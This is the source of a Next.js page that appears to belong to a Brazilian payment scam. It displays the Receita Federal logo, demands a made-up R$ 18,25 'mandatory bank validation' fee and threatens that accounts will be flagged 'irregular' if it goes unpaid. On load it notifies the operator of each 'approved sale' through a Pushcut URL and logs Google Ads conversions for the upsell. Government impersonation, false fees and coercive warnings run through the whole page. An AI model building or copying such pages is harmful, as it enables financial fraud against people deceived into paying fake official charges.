"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { useEffect, useRef, Suspense } from "react";
import Image from "next/image";
import Script from "next/script";
import { Lock, Check, AlertTriangle, Loader2 } from "lucide-react";

function ValidacaoContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const notificationSent = useRef(false);
  const placa = searchParams.get("placa") || "";
  const valor = searchParams.get("valor") || "18.25";

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Venda%20aprovada%20", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Pagamento confirmado - Placa: ${placa} - Upsell: Validacao` }),
      }).catch(() => {});

      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028092080/fA0TCLnj0o0cELC1u5RD",
            value: 85.00,
            currency: "BRL",
            transaction_id: `${placa}-pendencia-${Date.now()}`,
          });
          (window as any).gtag("event", "conversion", {
            send_to: "AW-17936258767",
            value: 85.00,
            currency: "BRL",
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [placa]);

  const handleValidar = () => {
    router.push(`/pix-validacao?placa=${placa}&valor=18.25`);
  };

  return (
    <>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-18028092080"
        strategy="afterInteractive"
      />
      <Script id="gtag-validacao-principal" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-18028092080');
        `}
      </Script>
      <Script
        src="https://www.googletagmanager.com/gtag/js?id=AW-17936258767"
        strategy="afterInteractive"
      />
      <Script id="gtag-validacao" strategy="afterInteractive">
        {`
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'AW-17936258767');
        `}
      </Script>
      <div className="flex min-h-screen flex-col bg-zinc-100">
        {/* Header */}
        <header className="bg-[#1a3a5c] py-6">
          <div className="container mx-auto flex items-center justify-center px-4">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/receita%20logo-CcJylic56Yrlq63Gv5cnoS4Bw6Eqm7.png"
              alt="Receita Federal"
              width={200}
              height={60}
              className="h-12 w-auto"
            />
          </div>
        </header>

        {/* Main Content */}
        <main className="flex flex-1 flex-col items-center px-4 py-8">
          <div className="w-full max-w-md rounded-lg bg-white p-6 shadow-md">
            {/* Title */}
            <div className="mb-6 flex items-center justify-center gap-2">
              <Lock className="h-8 w-8 text-amber-500" />
              <h1 className="text-center text-2xl font-bold text-zinc-800">
                Validação Bancária
                <br />
                Obrigatória
              </h1>
            </div>

            {/* Description */}
            <p className="mb-6 text-center text-zinc-600">
              Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma{" "}
              <span className="font-semibold text-blue-600">validação bancária obrigatória</span>, conforme as
              normas do sistema bancário nacional.
            </p>

            {/* Info Card */}
            <div className="mb-6 rounded-lg bg-zinc-100 p-4">
              <h2 className="mb-4 font-bold text-zinc-800">Por que a validação é necessária?</h2>
              
              <div className="space-y-4">
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Evita transações inválidas ou bloqueios futuros.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Confirma a autenticidade dos seus dados bancários.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <Check className="mt-0.5 h-5 w-5 flex-shrink-0 text-zinc-700" />
                  <p className="text-zinc-600">Libera sua transferência com total segurança.</p>
                </div>
              </div>
            </div>

            {/* Value */}
            <div className="mb-2 text-center">
              <span className="font-bold text-zinc-800">Valor da Taxa: </span>
              <span className="text-xl font-bold text-green-600">R$ 18,25</span>
            </div>

            {/* Deadline */}
            <p className="mb-6 text-center text-zinc-600">
              <span className="font-bold">Prazo para Validação:</span> Até 15 minutos após o pagamento.
            </p>

            {/* Button */}
            <button
              type="button"
              onClick={handleValidar}
              className="w-full rounded-lg bg-[#1a3a5c] py-4 text-lg font-bold uppercase text-white transition-colors hover:bg-[#15304d]"
            >
              Validar Agora
            </button>

            {/* Warning */}
            <div className="mt-4 flex items-start gap-2 text-center">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-amber-500" />
              <p className="text-sm text-zinc-500">
                <span className="font-semibold text-amber-600">Atenção:</span> O não pagamento pode causar o registro de sua conta como{" "}
                <span className="font-semibold text-amber-600">irregular</span>, impactando futuras transações financeiras.
              </p>
            </div>
          </div>
        </main>
      </div>
    </>
  );
}

export default function ValidacaoPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-zinc-100">
          <Loader2 className="h-12 w-12 animate-spin text-[#1a3a5c]" />
        </div>
      }
    >
      <ValidacaoContent />
    </Suspense>
  );
}
